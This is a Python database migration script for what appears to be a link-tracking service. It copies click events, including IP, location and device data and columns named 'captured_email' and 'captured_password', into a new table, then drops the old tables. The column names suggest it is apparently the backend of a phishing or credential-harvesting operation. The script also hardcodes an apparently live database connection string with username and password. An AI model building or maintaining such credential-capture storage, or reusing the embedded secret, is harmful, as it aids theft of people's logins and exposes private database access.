#!/usr/bin/env python3
"""
Fix table migration with proper column mapping
"""
import os
import psycopg2
from urllib.parse import urlparse

def fix_table_migration():
    # Database URL from environment
    database_url = os.environ.get('DATABASE_URL', 'postgresql://neondb_owner:npg_7CcKbPRm2GDw@ep-odd-thunder-ade4ip4a-pooler.c-2.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require')
    
    # Parse the database URL
    parsed = urlparse(database_url)
    
    try:
        # Connect to the database
        conn = psycopg2.connect(
            host=parsed.hostname,
            port=parsed.port or 5432,
            database=parsed.path[1:],  # Remove leading slash
            user=parsed.username,
            password=parsed.password,
            sslmode='require'
        )
        
        with conn.cursor() as cursor:
            print("Fixing table migration with proper column mapping...")
            
            # 1. Check column structures
            print("1. Checking table structures...")
            
            # Get columns from old tracking_event table
            cursor.execute("""
                SELECT column_name, data_type 
                FROM information_schema.columns 
                WHERE table_name = 'tracking_event' 
                ORDER BY ordinal_position;
            """)
            old_event_columns = cursor.fetchall()
            print("Old tracking_event columns:")
            for col in old_event_columns:
                print(f"   {col[0]} ({col[1]})")
            
            # Get columns from new tracking_events table
            cursor.execute("""
                SELECT column_name, data_type 
                FROM information_schema.columns 
                WHERE table_name = 'tracking_events' 
                ORDER BY ordinal_position;
            """)
            new_event_columns = cursor.fetchall()
            print("New tracking_events columns:")
            for col in new_event_columns:
                print(f"   {col[0]} ({col[1]})")
            
            # 2. Migrate tracking_event data with column mapping
            print("\n2. Migrating tracking_event data with proper column mapping...")
            cursor.execute("SELECT COUNT(*) FROM tracking_event;")
            old_count = cursor.fetchone()[0]
            
            if old_count > 0:
                # Map compatible columns only, providing default values for required fields
                cursor.execute("""
                    INSERT INTO tracking_events (
                        link_id, event_type, ip_address, user_agent, country, region, city, 
                        device_type, browser, os, referrer, email, password, created_at
                    )
                    SELECT 
                        link_id, 'click' as event_type, ip_address, user_agent, country, region, city,
                        device_type, browser, os, referrer, captured_email, captured_password, timestamp
                    FROM tracking_event;
                """)
                conn.commit()
                print(f"   ✓ Migrated {old_count} tracking events")
            
            # 3. Now safely drop old tables
            print("\n3. Dropping old tables...")
            cursor.execute("DROP TABLE IF EXISTS tracking_event CASCADE;")
            cursor.execute("DROP TABLE IF EXISTS link CASCADE;")
            cursor.execute("DROP TABLE IF EXISTS \"user\" CASCADE;")
            conn.commit()
            print("   ✓ Dropped old tables")
            
            # 4. Verify final state
            print("\n4. Final verification...")
            cursor.execute("SELECT COUNT(*) FROM links;")
            links_count = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM tracking_events;")
            events_count = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM users;")
            users_count = cursor.fetchone()[0]
            
            print(f"   Links: {links_count} records")
            print(f"   Tracking Events: {events_count} records")
            print(f"   Users: {users_count} records")
            
            # 5. List final tables
            cursor.execute("""
                SELECT table_name 
                FROM information_schema.tables 
                WHERE table_schema = 'public' 
                ORDER BY table_name;
            """)
            tables = cursor.fetchall()
            
            print("\nFinal tables:")
            for table in tables:
                print(f"  ✓ {table[0]}")
        
        print("\n✅ Table migration fixed successfully!")
        
    except Exception as e:
        print(f"❌ Table migration fix failed: {e}")
        return False
    
    finally:
        if 'conn' in locals():
            conn.close()
    
    return True

if __name__ == "__main__":
    print("🔄 Fixing table migration...")
    success = fix_table_migration()
    if success:
        print("🎉 Table migration fixed!")
    else:
        print("💥 Table migration fix failed!")

